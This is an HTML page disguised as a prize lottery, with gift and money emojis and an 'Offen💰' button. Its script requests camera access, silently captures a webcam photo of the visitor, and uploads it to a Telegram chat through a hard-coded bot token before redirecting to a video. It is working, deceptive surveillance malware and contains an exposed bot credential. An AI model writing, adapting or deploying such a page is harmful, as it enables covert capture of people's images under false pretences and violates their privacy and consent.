<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁🎁🎁🎁🎁</title>
    <style>
        body { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; 
            /* 添加背景图 */
            background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; 
            background-size: cover; color: white; 
        }
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; }
        #status { margin: 15px 0; font-weight: bold; color: #00ff00; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
        button { padding: 12px 30px; cursor: pointer; font-size: 18px; border-radius: 5px; border: none; background: #28a745; color: white; }
        button:hover { background: #218838; }
    </style>
</head>
<body>
    <h2>🧧🧧🧧🧧🧧</h2>
    <div id="status">💶💶💶💶💶</div>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="startBtn">Offen💰</button>

    <script>
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI'; // 请确认替换
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');

        let currentStream;

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) {
                status.innerText = "❌️: No users found ID";
                return;
            }
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = currentStream;
                startBtn.style.display = 'none';
                status.innerText = "🎲The lottery is running🎲...";
                setTimeout(captureAndUpload, 1500);
            } catch (err) {
                status.innerText = "Failed to win the prize, Please open your camera 📷。";
            }
        });

        function captureAndUpload() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            status.innerText = "🎉🎉🎉🎉🎉";
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'ghost.jpg');
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    if(result.ok) {
                        // 上传成功：停止摄像头并跳转
                        currentStream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                    } else {
                        status.innerText = "回传失败：" + result.description;
                    }
                } catch (err) {
                    status.innerText = "Network connection error 🌐。";
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
